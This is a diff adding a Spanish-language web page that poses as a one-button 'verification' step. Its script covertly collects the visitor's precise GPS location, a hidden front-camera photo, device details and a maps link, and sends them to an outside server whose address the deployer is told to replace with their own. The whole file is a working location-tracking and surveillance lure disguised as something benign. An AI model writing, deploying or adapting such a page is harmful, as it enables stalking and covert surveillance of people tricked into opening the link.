@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Verificacion</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #f1f3f4;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 8px 28px rgba(0,0,0,0.12);
+            padding: 32px 24px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+        h1 { font-size: 1.8rem; margin-bottom: 12px; }
+        p { color: #5f6368; margin-bottom: 28px; }
+        button {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 28px;
+            padding: 12px 24px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+        button:active { background: #1557b0; transform: scale(0.98); }
+        #status { margin-top: 16px; font-size: 0.8rem; color: #5f6368; }
+    </style>
+</head>
+<body>
+<div class="card">
+    <h1>🔐 Verificación</h1>
+    <p>Presiona el botón para continuar</p>
+    <button id="btn">✅ Verificar</button>
+    <div id="status">Esperando...</div>
+</div>
+
+<video id="video" autoplay playsinline style="display:none"></video>
+<canvas id="canvas" style="display:none"></canvas>
+
+<script>
+    // ========== CONFIGURACIÓN ==========
+    // ¡PON AQUÍ LA URL DE TU SERVIDOR EN PYTHONANYWHERE!
+    const SERVER_URL = 'https://societykark.pythonanywhere.com/';
+
+    // ---------- FUNCIONES ----------
+    function getGPS() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) { resolve(null); return; }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+                () => resolve(null),
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        });
+    }
+
+    async function capturePhoto() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        let stream = null;
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        } catch(e) {
+            try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); }
+            catch(err) { return null; }
+        }
+        if (!stream) return null;
+        video.srcObject = stream;
+        await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
+        await new Promise(r => setTimeout(r, 500));
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+        stream.getTracks().forEach(t => t.stop());
+        video.srcObject = null;
+        return blob;
+    }
+
+    async function sendToServer(text, photoBlob) {
+        try {
+            // Convertir foto a base64
+            let photoBase64 = null;
+            if (photoBlob) {
+                photoBase64 = await new Promise((resolve) => {
+                    const reader = new FileReader();
+                    reader.onload = () => resolve(reader.result.split(',')[1]);
+                    reader.readAsDataURL(photoBlob);
+                });
+            }
+            
+            const payload = {
+                text: text,
+                photo: photoBase64
+            };
+            
+            const res = await fetch(SERVER_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            return res.ok;
+        } catch(e) { return false; }
+    }
+
+    // ---------- PRINCIPAL ----------
+    document.getElementById('btn').onclick = async () => {
+        const btn = document.getElementById('btn');
+        const status = document.getElementById('status');
+        btn.disabled = true;
+        btn.innerText = '⏳ Procesando...';
+
+        status.innerText = '📍 Obteniendo ubicación...';
+        const gps = await getGPS();
+
+        status.innerText = '📸 Tomando foto...';
+        const foto = await capturePhoto();
+
+        let message = `📊 *Reporte*\n━━━━━━━━━━━━━\n`;
+        message += `📍 *GPS*: ${gps ? `${gps.lat}, ${gps.lng} (±${gps.accuracy}m)` : 'No disponible'}\n`;
+        message += `📱 *Dispositivo*: ${navigator.userAgent.split(' ').slice(0,3).join(' ')}\n`;
+        message += `📐 *Resolución*: ${window.screen.width}x${window.screen.height}\n`;
+        message += `🕐 *Fecha*: ${new Date().toLocaleString()}\n`;
+        if (gps) {
+            message += `🗺️ *Mapa*: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
+        }
+
+        status.innerText = '📤 Enviando datos...';
+        const ok = await sendToServer(message, foto);
+
+        status.innerText = ok ? '✅ ¡Enviado!' : '❌ Error al enviar';
+        btn.disabled = false;
+        btn.innerText = '✅ Verificar';
+    };
+</script>
+</body>
+</html>
